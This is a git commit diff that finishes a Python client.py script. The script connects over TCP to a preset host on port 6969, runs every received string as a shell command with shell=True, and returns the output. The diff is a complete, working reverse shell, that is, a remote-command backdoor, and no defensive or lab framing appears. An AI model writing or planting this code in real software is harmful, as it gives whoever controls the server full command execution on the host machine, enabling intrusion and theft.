7b3312e007601b97cef0985dfb457f7da8bc9c77
Brett Huber <hawktalon505@gmail.com>
2023-04-11 23:25:17 -0400

    Finished client.py and checked functionality

--- client.py
+++ client.py
@@ -7,7 +7,12 @@ portNumber = 6969 # Specifies the port used for communication
 try:
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Creates a TCP and IPV4 socket
     sock.connect((hostAddress, portNumber)) # Connect to the server socket
-
+    while True: # Runs a loop until break statement is triggered
+        receiveCommand = sock.recv(1024).decode().strip()
+        if not receiveCommand: # Checks to see if the receiveCommand is nothing
+            break # Breaks the loop
+        commandOutput = subprocess.check_output(receiveCommand, shell = True) # Takes the received command and executes it in the terminal
+        sock.sendall(commandOutput) # Sends the output of the command to the socket connection
 except Exception as error:
     print(f"Error Message: {error}") # Prints error message
 finally:
